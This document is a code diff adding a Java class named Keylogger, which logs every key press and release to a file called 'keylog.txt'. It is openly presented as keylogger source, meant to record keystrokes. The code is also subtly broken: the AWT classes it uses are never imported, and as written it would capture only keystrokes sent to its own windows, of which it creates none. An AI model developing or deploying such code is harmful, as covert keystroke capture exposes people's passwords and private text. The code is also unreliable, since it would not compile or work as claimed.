@@ -1,0 +1,30 @@
+import java.io.*;
+import java.util.logging.*;
+
+public class Keylogger {
+  private static final Logger logger = Logger.getLogger(Keylogger.class.getName());
+  private static final String filename = "keylog.txt";
+
+  public static void main(String[] args) {
+    try {
+      FileHandler fileHandler = new FileHandler(filename, true);
+      logger.addHandler(fileHandler);
+      logger.setLevel(Level.ALL);
+
+      KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(new KeyEventDispatcher() {
+        @Override
+        public boolean dispatchKeyEvent(KeyEvent event) {
+          String key = KeyEvent.getKeyText(event.getKeyCode());
+          if (event.getID() == KeyEvent.KEY_PRESSED) {
+            logger.info("Key Pressed: " + key);
+          } else if (event.getID() == KeyEvent.KEY_RELEASED) {
+            logger.info("Key Released: " + key);
+          }
+          return false;
+        }
+      });
+    } catch (IOException e) {
+      e.printStackTrace();
+    }
+  }
+}
